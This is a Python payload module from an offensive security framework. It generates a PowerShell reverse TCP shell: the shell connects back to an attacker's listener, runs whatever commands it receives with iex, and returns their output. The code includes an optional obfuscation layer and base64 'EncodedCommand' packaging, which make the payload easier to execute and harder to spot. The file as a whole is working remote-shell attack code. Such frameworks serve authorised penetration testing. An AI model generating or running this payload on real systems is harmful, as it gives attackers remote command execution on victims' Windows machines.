from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "powershell"
	
	__info__ = {
		'name': 'PowerShell Command Shell, Reverse TCP',
		'description': 'Connect back and create a command shell via PowerShell',
		'category': PayloadCategory.SINGLE,
		'arch': Arch.OTHER,  # PowerShell is interpreted, not architecture-specific
		'platform': Platform.WINDOWS,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE,
		'session_type': SessionType.SHELL
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(4444, 'Connect to port', True)
	encoder = OptString("", "Encoder", False, True)

	def _build_script(self, obf_client_code: str = None) -> str:
		if obf_client_code:
			return (
				obf_client_code
				+ f"$c=New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});"
				"$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
				"while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
				"$chunk=New-Object byte[] $i;[Array]::Copy($b,0,$chunk,0,$i);"
				"$decoded=_obf_decode $chunk;"
				"if($null -eq $decoded -or $decoded.Length -eq 0){continue};"
				"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($decoded,0,$decoded.Length);"
				"$sb=(iex $d 2>&1|Out-String);"
				"$sb2=$sb+'PS '+($pwd).Path+'> ';"
				"$plain=([text.encoding]::ASCII).GetBytes($sb2);"
				"$by=_obf_encode $plain;"
				"$s.Write($by,0,$by.Length);$s.Flush()"
				"};$c.Close()"
			)
		return f"$c=New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+($pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()}};$c.Close()"

	def generate(self):
		"""Generate PowerShell reverse TCP payload using base64 encoding for reliability"""
		obf = self._get_obfuscator_instance()
		obf_code = None
		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
			obf_code = obf.generate_client_code(self._get_client_language())
		if obf and not self._is_obfuscator_compatible(obf):
			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
			print_warning(f"Obfuscator does not support client language 'powershell' (supported: {supported}). Generating without obfuscation.")

		powershell_script = self._build_script(obf_code)
		
		# Encode to base64 for reliable execution (avoids escaping issues)
		encoded_script = base64.b64encode(powershell_script.encode('utf-16le')).decode('utf-8')
		
		# Use -EncodedCommand for base64 or -Command for direct execution
		# Base64 encoding is more reliable for complex commands
		powershell_cmd = f"powershell -nop -EncodedCommand {encoded_script}"
		
		return powershell_cmd
